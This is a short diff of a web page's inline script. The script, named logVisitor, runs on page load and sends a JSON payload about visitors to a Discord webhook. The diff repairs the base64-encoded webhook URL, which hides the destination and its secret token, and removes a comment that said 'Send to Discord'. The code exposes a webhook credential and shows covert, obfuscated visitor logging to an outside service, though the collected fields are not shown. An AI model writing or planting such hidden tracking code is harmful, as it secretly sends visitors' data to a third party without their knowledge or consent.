@@ -258,7 +258,7 @@
     </div>
   </div>
 <script>
-  const aL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjIwOTIxNzk3NTI5NjA1NS9GWGZuSXlINEhXelkzM2w0NVd2LTRiTXRRbTVDcEhGbDVERWRsdW0zWGdFSldVelNOakNxdmFzYy16R29CTE1MX19MRA";
+  const aL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjIwOTIxNzk3NTI5NjA1NS9GWGZuSXlINEhXelkzM2w0NVd2LTRiTXRRbTVDcEhGbDVERWRsdW0zWGdFSldVelNOakNxdmFzYy16R29CTE1MX19MRA==";
 
   (async function logVisitor() {
     try {
@@ -288,7 +288,6 @@
         }]
       };
 
-      // 3. Send to Discord
       await fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
